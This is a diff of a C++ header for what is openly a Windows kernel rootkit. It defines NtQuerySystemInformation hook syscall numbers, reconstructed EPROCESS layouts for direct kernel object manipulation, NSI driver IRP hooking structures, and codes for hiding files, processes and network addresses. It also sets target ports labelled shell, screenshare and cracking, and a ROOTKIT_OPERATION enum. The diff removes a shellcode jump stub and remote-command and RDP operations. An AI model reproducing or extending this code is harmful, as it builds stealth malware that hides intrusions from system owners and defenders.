@@ -6,25 +6,32 @@
 #include <ntimage.h>
 #include <minwindef.h>
 #include "problematic.h"
+
 #define IS_DKOM 1  // TRUE, 0 = NtQuerySystemInformation hook
 #define NTQUERY_TAG 'HkQr'
 #define NTQUERYEX_TAG 'HkQx'
 #define NTQUERYSYSINFO_TAG 'HkSi'
 #define TCPIP_TAG 'DoTi'
 #define NSIPROXY_TAG 'DoNp'
-#define NTQUERYEX_SYSCALL22H2 0x014b
-#define NTQUERYEX_SYSCALL1809 0x013b 
-#define NTQUERY_SYSCALL22H2 0x0035
-#define NTQUERY_SYSCALL1809 0x0035
-#define NTQUERYSYSINFO_SYSCALL22H2 0x0036
-#define NTQUERYSYSINFO_SYSCALL1809 0x0036
+
+
+/* Note: because of
+https://support.microsoft.com/en-gb/topic/march-25-2024-kb5037425-os-build-17763-5579-out-of-band-fa8fb7fa-8185-408f-bdd6-ea575ce2fcb5
+the syscall numbers for 1809 match the ones for windows 10 21H2/22H2
+*/
+
+#define NTQUERYEX_SYSCALL 0x0143
+#define NTQUERY_SYSCALL 0x0035
+#define NTQUERYSYSINFO_SYSCALL 0x0036
 #define REGULAR_BUFFER 0xDEAFBEED  // Represents a normal buffer
+
+
+// Default port numbers:
 #define DEFAULT_MEDIUM_PORT 44444
-
-
-// Default shellcode for hooks:
-CONST BYTE DEFAULT_SHELLCODE[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
-									0x41, 0xff, 0xe5 };  // jmp r13 (jmp evilfunction)
+#define TARGET_WEBSERVER 8050
+#define TARGET_SHELL 8060
+#define TARGET_SCREENSHARE 8070
+#define TARGET_CRACKING 8090
 
 
 // Definitions of file/process/port hiding values:
@@ -44,29 +51,115 @@ CONST BYTE DEFAULT_SHELLCODE[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0
 #define HideProcess 0xCDCDCDCDDCDCDCDC
 #define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0
 
-#define UnhidePort 0xC0C0C0C00C0C0C0C
-#define HidePort 0xCDCDCDCDDCDCDCDC
-#define ListHiddenPorts 0x0D0D0D0DD0D0D0D0
-#define REMOVE_BY_INDEX_PORT 47
+#define UnhideAddress 0xC0C0C0C00C0C0C0C
+#define HideAddress 0xCDCDCDCDDCDCDCDC
+#define ListHiddenAddresses 0x0D0D0D0DD0D0D0D0
+#define REMOVE_BY_INDEX_ADDR 0xFFFFFFFF
+#define IOCTL_NSI_QUERYCONNS 0x12001B
+#define NSI_PARAMS_LENGTH 0x70
+
+typedef struct _EX_FAST_REF {
+	PVOID Object;
+} EX_FAST_REF, * PEX_FAST_REF;
+
+typedef struct _RTL_AVL_TREE {
+	RTL_BALANCED_NODE* Root;
+} RTL_AVL_TREE, * PRTL_AVL_TREE;
+
+typedef struct _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES {
+	RTL_AVL_TREE Tree;
+	EX_PUSH_LOCK Lock;
+} PS_DYNAMIC_ENFORCED_ADDRESS_RANGES, *PPS_DYNAMIC_ENFORCED_ADDRESS_RANGES;
 
 typedef struct _KAFFINITY_EX {
 	char Affinity[0xA8];
 } KAFFINITY_EX, * PKAFFINITY_EX;
 
 typedef struct _KSTACK_COUNT {
-	char Affinity[4];
+	ULONG State;
+	ULONG StackCount;
 } KSTACK_COUNT, * PKSTACK_COUNT;
 
+typedef struct _MMSUPPORT_FLAGS {
+	/*
+	0x000 WorkingSetType   : Pos 0, 3 Bits
+		+ 0x000 Reserved0 : Pos 3, 3 Bits
+		+ 0x000 MaximumWorkingSetHard : Pos 6, 1 Bit
+		+ 0x000 MinimumWorkingSetHard : Pos 7, 1 Bit
+		+ 0x001 SessionMaster : Pos 0, 1 Bit
+		+ 0x001 TrimmerState : Pos 1, 2 Bits
+		+ 0x001 Reserved : Pos 3, 1 Bit
+		+ 0x001 PageStealers : Pos 4, 4 Bits
+		*/
+	USHORT u1;
+	UCHAR MemoryPriority;
+		/*
+		+ 0x003 WsleDeleted : Pos 0, 1 Bit
+		+ 0x003 SvmEnabled : Pos 1, 1 Bit
+		+ 0x003 ForceAge : Pos 2, 1 Bit
+		+ 0x003 ForceTrim : Pos 3, 1 Bit
+		+ 0x003 NewMaximum : Pos 4, 1 Bit
+		+ 0x003 CommitReleaseState : Pos 5, 2 Bits
+		*/
+	UCHAR u2;
+}MMSUPPORT_FLAGS, * PMMSUPPORT_FLAGS;
+
+typedef struct _MMSUPPORT_INSTANCE {
+	UINT NextPageColor;
+	UINT PageFaultCount;
+	UINT64 TrimmedPageCount;
+	PVOID VmWorkingSetList;
+	LIST_ENTRY WorkingSetExpansionLinks;
+	UINT64 AgeDistribution[8];
+	PVOID ExitOutswapGate;
+	UINT64 MinimumWorkingSetSize;
+	UINT64 WorkingSetLeafSize;
+	UINT64 WorkingSetLeafPrivateSize;
+	UINT64 WorkingSetSize;
+	UINT64 WorkingSetPrivateSize;
+	UINT64 MaximumWorkingSetSize;
+	UINT64 PeakWorkingSetSize;
+	UINT HardFaultCount;
+	USHORT LastTrimStamp;
+	USHORT PartitionId;
+	UINT64 SelfmapLock;
+	MMSUPPORT_FLAGS Flags;
+} MMSUPPORT_INSTANCE, * PMMSUPPORT_INSTANCE;
+
+typedef struct _MMSUPPORT_SHARED {
+	long WorkingSetLock;
+	long GoodCitizenWaiting;
+	UINT64 ReleasedCommitDebt;
+	UINT64 ResetPagesRepurposedCount;
+	PVOID WsSwapSupport;
+	PVOID CommitReleaseContext;
+	PVOID AccessLog;
+	UINT64 ChargedWslePages;
+	UINT64 ActualWslePages;
+	UINT64 WorkingSetCoreLock;
+	PVOID ShadowMapping;
+} MMSUPPORT_SHARED, * PMMSUPPORT_SHARED;
+
 typedef struct _MMSUPPORT_FULL {
-	char Vm[0x110];
+	MMSUPPORT_INSTANCE Instance;
+	MMSUPPORT_SHARED Shared;
+	UCHAR Padding[48];
 } MMSUPPORT_FULL, * PMMSUPPORT_FULL;
 
 typedef struct _ALPC_PROCESS_CONTEXT {
 	char AlpcContext[0x20];
 } ALPC_PROCESS_CONTEXT, * PALPC_PROCESS_CONTEXT;
 
+typedef struct _JOBOBJECT_WAKE_FILTER{
+	UINT HighEdgeFilter;
+	UINT LowEdgeFilter;
+} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;
+
 typedef struct _PS_PROCESS_WAKE_INFORMATION {
-	char WakeInfo[0x30];
+	UINT64 NotificationChannel;
+	UINT WakeCounters[7];
+	JOBOBJECT_WAKE_FILTER WakeFilter;
+	UINT NoWakeCounter;
 } PS_PROCESS_WAKE_INFORMATION, * PPS_PROCESS_WAKE_INFORMATION;
 
 typedef struct _PS_PROTECTION
@@ -83,6 +176,19 @@ typedef struct _PS_PROTECTION
 	};
 } PS_PROTECTION, * PPS_PROTECTION;
 
+extern "C" NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
+	PUNICODE_STRING ObjectName,
+	ULONG Attributes,
+	PACCESS_STATE AccessState,
+	ACCESS_MASK DesiredAccess,
+	POBJECT_TYPE ObjectType,
+	KPROCESSOR_MODE AccessMode,
+	PVOID ParseContext OPTIONAL,
+	PVOID * Object
+);
+
+extern "C" POBJECT_TYPE * IoDriverObjectType;
+
 
 // Internal EPROCESS/KPROCESS of 1809:
 typedef struct _ACTKPROCESS {
@@ -94,9 +200,11 @@ typedef struct _ACTKPROCESS {
 	UINT ProcessTimerDelay;
 	UINT64 DeepFreezeStartTime;
 	KAFFINITY_EX Affinity;
+	UINT64 AffinityPadding[12];
 	LIST_ENTRY ReadyListHead;
 	SINGLE_LIST_ENTRY SwapListEntry;
 	KAFFINITY_EX ActiveProcessors;
+	UINT64 ActiveProcessorsPadding[12];
 	/*
    AutoAlignment    : Pos 0; 1 Bit
    DisableBoost     : Pos 1; 1 Bit
@@ -111,12 +219,17 @@ typedef struct _ACTKPROCESS {
    ReservedFlags    : Pos 31; 1 Bit
 	*/
 	int ProcessFlags;
+	int ActiveGroupsMask;
 	char BasePriority;
 	char QuantumReset;
 	char Visited;
 	char Flags;
-	UINT ThreadSeed[20];
+	USHORT ThreadSeed[20];
+	USHORT ThreadSeedPadding[12];
+	USHORT IdealProcessor[20];
+	USHORT IdealProcessorPadding[12];
 	USHORT IdealNode[20];
+	USHORT IdealNodePadding[12];
 	USHORT IdealGlobalNode;
 	USHORT Spare1;
 	KSTACK_COUNT StackCount;
@@ -133,11 +246,14 @@ typedef struct _ACTKPROCESS {
 	UCHAR Spare[71];
 	PVOID InstrumentationCallback;
 	PVOID SecureState;
+	PVOID KernelWaitTime;
+	PVOID UserWaitTime;
+	UINT64 EndPadding[8];
 } ACTKPROCESS, * PACTKPROCESS;
 
 typedef struct _ACTEPROCESS {
 	ACTKPROCESS Pcb;
-	ULONG_PTR ProcessLock;
+	EX_PUSH_LOCK ProcessLock;
 	PVOID UniqueProcessId;
 	LIST_ENTRY ActiveProcessLinks;
 	EX_RUNDOWN_REF RundownProtect;
@@ -214,7 +330,7 @@ typedef struct _ACTEPROCESS {
 	/*
 + 0x350 ExceptionPortState : Pos 0, 3 Bits
 */
-	ULONG64 Token;
+	EX_FAST_REF Token;
 	UINT64 MmReserved;
 	ULONG_PTR AddressCreationLock;
 	ULONG_PTR PageTableCommitmentLock;
@@ -232,7 +348,6 @@ typedef struct _ACTEPROCESS {
 	PVOID WorkingSetWatch;
 	PVOID Win32WindowStation;
 	PVOID InheritedFromUniqueProcessId;
-	PVOID Spare0;
 	UINT64 OwnerProcessId;
 	PVOID Peb;
 	PVOID Session;
@@ -256,7 +371,7 @@ typedef struct _ACTEPROCESS {
 	UINT ImagePathHash;
 	UINT DefaultHardErrorProcessing;
 	int LastThreadExitStatus;
-	ULONG64 PrefetchTrace;
+	EX_FAST_REF PrefetchTrace;
 	PVOID LockedPagesList;
 	LARGE_INTEGER ReadOperationCount;
 	LARGE_INTEGER WriteOperationCount;
@@ -266,70 +381,83 @@ typedef struct _ACTEPROCESS {
 	LARGE_INTEGER OtherTransferCount;
 	UINT64 CommitChargeLimit;
 	UINT64 CommitCharge;
-	UINT64 CommitChargePeak;
+	UCHAR CommitChargePeak[48];
 	MMSUPPORT_FULL Vm;
 	LIST_ENTRY MmProcessLinks;
 	UINT ModifiedPageCount;
 	int ExitStatus;
-	ULONG64 VadRoot;
+	RTL_AVL_TREE VadRoot;
 	PVOID VadHint;
 	UINT64 VadCount;
 	UINT64 VadPhysicalPages;
 	UINT64 VadPhysicalPagesLimit;
 	ALPC_PROCESS_CONTEXT AlpcContext;
+
 	LIST_ENTRY TimerResolutionLink;
 	PVOID TimerResolutionStackRecord;
 	UINT RequestedTimerResolution;
 	UINT SmallestTimerResolution;
 	LARGE_INTEGER ExitTime;
 	PVOID InvertedFunctionTable;
-	ULONG_PTR InvertedFunctionTableLock;
+	EX_PUSH_LOCK InvertedFunctionTableLock;
 	UINT ActiveThreadsHighWatermark;
 	UINT LargePrivateVadCount;
-	ULONG_PTR ThreadListLock;
+	EX_PUSH_LOCK ThreadListLock;
 	PVOID WnfContext;
 	PVOID ServerSilo;
 	UCHAR SignatureLevel;
 	UCHAR SectionSignatureLevel;
 	PS_PROTECTION Protection;
-	UINT Flags3;
-	/*
-+ 0x6cc Minimal : Pos 0, 1 Bit
-		+ 0x6cc ReplacingPageRoot : Pos 1, 1 Bit
-		+ 0x6cc Crashed : Pos 2, 1 Bit
-		+ 0x6cc JobVadsAreTracked : Pos 3, 1 Bit
-		+ 0x6cc VadTrackingDisabled : Pos 4, 1 Bit
-		+ 0x6cc AuxiliaryProcess : Pos 5, 1 Bit
-		+ 0x6cc SubsystemProcess : Pos 6, 1 Bit
-		+ 0x6cc IndirectCpuSets : Pos 7, 1 Bit
-		+ 0x6cc RelinquishedCommit : Pos 8, 1 Bit
-		+ 0x6cc HighGraphicsPriority : Pos 9, 1 Bit
-		+ 0x6cc CommitFailLogged : Pos 10, 1 Bit
-		+ 0x6cc ReserveFailLogged : Pos 11, 1 Bit
-		+ 0x6cc SystemProcess : Pos 12, 1 Bit
-		+ 0x6cc HideImageBaseAddresses : Pos 13, 1 Bit
-		+ 0x6cc AddressPolicyFrozen : Pos 14, 1 Bit
-		+ 0x6cc ProcessFirstResume : Pos 15, 1 Bit
-		+ 0x6cc ForegroundExternal : Pos 16, 1 Bit
-		+ 0x6cc ForegroundSystem : Pos 17, 1 Bit
-		+ 0x6cc HighMemoryPriority : Pos 18, 1 Bit
-		+ 0x6cc EnableProcessSuspendResumeLogging : Pos 19, 1 Bit
-		+ 0x6cc EnableThreadSuspendResumeLogging : Pos 20, 1 Bit
-		+ 0x6cc SecurityDomainChanged : Pos 21, 1 Bit
-		+ 0x6cc SecurityFreezeComplete : Pos 22, 1 Bit
-		+ 0x6cc VmProcessorHost : Pos 23, 1 Bit
-		*/
+	union {
+		UCHAR HangCount;
+		UCHAR GhostCount;
+		UCHAR PrefilterException;
+	};
+	union {
+		UINT Flags3;
+		UINT Minimal;
+		UINT ReplacingPageRoot;
+		UINT Crashed;
+		UINT JobVadsAreTracked;
+		UINT VadTrackingDisabled;
+		UINT AuxiliaryProcess;
+		UINT SubsystemProcess;
+		UINT IndirectCpuSets;
+		UINT RelinquishedCommit;
+		UINT HighGraphicsPriority;
+		UINT CommitFailLogged;
+		UINT ReserveFailLogged;
+		UINT SystemProcess;
+		UINT HideImageBaseAddresses;
+		UINT AddressPolicyFrozen;
+		UINT ProcessFirstResume;
+		UINT ForegroundExternal;
+		UINT ForegroundSystem;
+		UINT HighMemoryPriority;
+		UINT EnableProcessSuspendResumeLogging;
+		UINT EnableThreadSuspendResumeLogging;
+		UINT SecurityDomainChanged;
+		UINT SecurityFreezeComplete;
+		UINT VmProcessorHost;
+		UINT VmProcessorHostTransition;
+		UINT AltSyscall;
+		UINT TimerResolutionIgnore;
+		UINT DisallowUserTerminate;
+	};
+
 	INT64 DeviceAsid;
 	PVOID SvmData;
-	ULONG_PTR SvmProcessLock;
+	EX_PUSH_LOCK SvmProcessLock;
 	UINT64 SvmLock;
+
 	LIST_ENTRY SvmProcessDeviceListHead;
 	UINT64 LastFreezeInterruptTime;
 	PVOID DiskCounters;
 	PVOID PicoContext;
 	PVOID EnclaveTable;
 	UINT64 EnclaveNumber;
-	ULONG_PTR EnclaveLock;
+	EX_PUSH_LOCK EnclaveLock;
+
 	UINT64 HighPriorityFaultsAllowed;
 	PVOID EnergyContext;
 	PVOID VmContext;
@@ -338,16 +466,25 @@ typedef struct _ACTEPROCESS {
 	UINT64 CreateUnbiasedInterruptTime;
 	UINT64 TotalUnbiasedFrozenTime;
 	UINT64 LastAppStateUpdateTime;
-	ULONG64 LastAppState;
-	/*
-		+ 0x770 LastAppStateUptime : Pos 0, 61 Bits
-		+ 0x770 LastAppState : Pos 61, 3 Bits
-		*/
+
+	union {
+		ULONG64 LastAppStateUptime;
+		ULONG64 LastAppState;
+	};
+
 	UINT64 SharedCommitCharge;
-	ULONG_PTR SharedCommitLock;
+	EX_PUSH_LOCK SharedCommitLock;
 	LIST_ENTRY SharedCommitLinks;
-	UINT64 AllowedCpuSets;  // Can also be AllowedCpuSetsIndirect (PVOID)
-	UINT64 DefaultCpuSets;  // Can also be DefaultCpuSetsIndirect (PVOID)
+
+	union {
+		UINT64 AllowedCpuSets;
+		UINT64 AllowedCpuSetsIndirect;
+	};
+	union {
+		UINT64 DefaultCpuSets;
+		UINT64 DefaultCpuSetsIndirect;
+	};
+
 	PVOID DiskIoAttribution;
 	PVOID DxgProcess;
 	UINT64 Win32KFilterSet;
@@ -356,15 +493,38 @@ typedef struct _ACTEPROCESS {
 	UINT KTimer2Sets;
 	UINT64 ThreadTimerSets;
 	UINT64 VirtualTimerListLock;
+
+
 	LIST_ENTRY VirtualTimerListHead;
-	PS_PROCESS_WAKE_INFORMATION WakeInfo;  // Can also be WakeChannel (WNF_STATE_NAME)
-	UINT MitigationFlags;
-	UINT MitigationFlags2;
+	union {
+		WNF_STATE_NAME WakeChannel;
+		PS_PROCESS_WAKE_INFORMATION WakeInfo;
+	};
+
+	union {
+		UINT MitigationFlags;
+		UINT MitigationFlagsValues;
+	};
+
+	union {
+		UINT MitigationFlags2;
+		UINT MitigationFlags2Values;
+	};
 	PVOID PartitionObject;
 	UINT64 SecurityDomain;
 	UINT64 ParentSecurityDomain;
-	PVOID CoverageSamplerContext;
+	PVOID CoverageSamplerContext;		
 	PVOID MmHotPatchContext;
+	RTL_AVL_TREE DynamicEHContinuationTargetsTree;
+	EX_PUSH_LOCK DynamicEHContinuationTargetsLock;
+	PS_DYNAMIC_ENFORCED_ADDRESS_RANGES DynamicEnforcedCetCompatibleRanges;
+	UINT64 DisabledComponentFlags;
+	UINT64 PathRedirectionHashes;
+
+	union {
+		ULONG MitigationFlags3[4];
+		ULONG MitigationFlags3Values[4];
+	};
 } ACTEPROCESS, * PACTEPROCESS;
 
 typedef struct _SHORTENEDACTEPROCESS {
@@ -396,15 +556,6 @@ REQUIRED DEFINITIONS:
 
 
 // IRP definitions:
-
-constexpr ULONG IOCTL_NSI_GETALLPARAM = 0x12001B;
-
-
-extern PDRIVER_OBJECT pNsi_driver_object;
-extern PDRIVER_DISPATCH original_nsi_device_io;
-
-typedef unsigned long DWORD;
-
 typedef struct _HP_CONTEXT
 {
 	PIO_COMPLETION_ROUTINE oldIocomplete;
@@ -456,6 +607,47 @@ typedef struct _NSI_PARAM
 
 
 }NSI_PARAM, * PNSI_PARAM;
+
+
+typedef struct _HOOKED_IO_COMPLETION {
+	PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
+	PVOID OriginalContext;
+	LONG InvokeOnSuccess;
+	PEPROCESS RequestingProcess;
+} HOOKED_IO_COMPLETION, * PHOOKED_IO_COMPLETION;
+
+
+typedef enum _NPI_MODULEID_TYPE {
+	MIT_GUID = 1,
+	MIT_IF_LUID,
+} NPI_MODULEID_TYPE;
+
+typedef struct _NPI_MODULEID {
+	USHORT            Length;
+	NPI_MODULEID_TYPE Type;
+	union {
+		GUID Guid;
+		LUID IfLuid;
+	};
+} NPI_MODULEID, * PNPI_MODULEID;
+
+typedef struct _NSI_STRUCTURE_ENTRY {
+	ULONG IpAddress;
+	UCHAR Unknown[52];
+} NSI_STRUCTURE_ENTRY, * PNSI_STRUCTURE_ENTRY;
+
+typedef struct _NSI_STRUCTURE_2 {
+	UCHAR Unknown[32];
+	NSI_STRUCTURE_ENTRY EntriesStart[1];
+} NSI_STRUCTURE_2, * PNSI_STRUCTURE_2;
+
+typedef struct _NSI_STRUCTURE_1 {
+	UCHAR Unknown1[40];
+	PNSI_STRUCTURE_2 Entries;
+	SIZE_T EntrySize;
+	UCHAR Unknown2[48];
+	SIZE_T NumberOfEntries;
+} NSI_STRUCTURE_1, * PNSI_STRUCTURE_1;
 
 
 // ZwQuerySystemInformation return structures -
@@ -648,11 +840,7 @@ typedef enum _ROOTKIT_OPERATION {
 	RKOP_PRCMALLOC = 0xB00000AF,
 	RKOP_HIDEFILE = 0xB00000BF,
 	RKOP_HIDEPROC = 0xB00000CF,
-	RKOP_HIDEPORT = 0xB00000DF,
-
-	RKOP_GETFILE = 0xB00000EF,
-	RKOP_EXECOMMAND = 0xB00000FF,
-	RKOP_ACTIVATERDP = 0xB0000100,
+	RKOP_HIDEADDR = 0xB00000DF,
 
 	RKOP_NOOPERATION = 0xB0000101,
 	RKOP_TERMINATE = 0xB0000102,
